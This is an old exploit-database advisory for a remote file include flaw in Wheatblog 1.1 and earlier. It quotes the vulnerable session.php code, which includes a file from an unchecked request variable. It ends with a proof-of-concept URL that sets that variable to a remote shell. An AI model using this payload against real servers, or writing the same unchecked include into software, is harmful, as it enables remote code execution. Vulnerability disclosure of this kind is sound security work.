<html><head><title>Wheatblog <= 1.1 (session.php) Remote File Include Vulnerability</title></head><pre>###########################################################################################
#                                   Aria-Security.net Advisory                            #
#                                 Discovered  by: O.U.T.L.A.W                             #
#                                &lt; www.Aria-security.net &gt;                                #
#                      Gr33t to: A.u.r.a  &amp; l2odon &amp; DrtRp &amp; Sh3ll                        #              
###########################################################################################


&lt;?php
include_once(&quot;$wb_class_dir/classDatabase.php&quot;);


function Start_Session()
{
    global $session_dir;

    if ( $session_dir != '' )
        session_save_path($session_dir);

    if ( ! isset($_SESSION) )
    {
        session_start();
        // Supposedly a fix for IE6
        header('Cache-control: private');
        My_Cache();

        if ( ! isset($_SESSION['db']) || gettype($_SESSION['db']-&gt;db) != 'resource')
            touchDatabaseSession();

    }
}


***********************************************************************

Proof of Concept:
www.site.com/includes/session.php?wb_class_dir=SHELL

Contact : Outlaw@aria-security.net

# milw0rm.com [2006-08-11]</pre></html>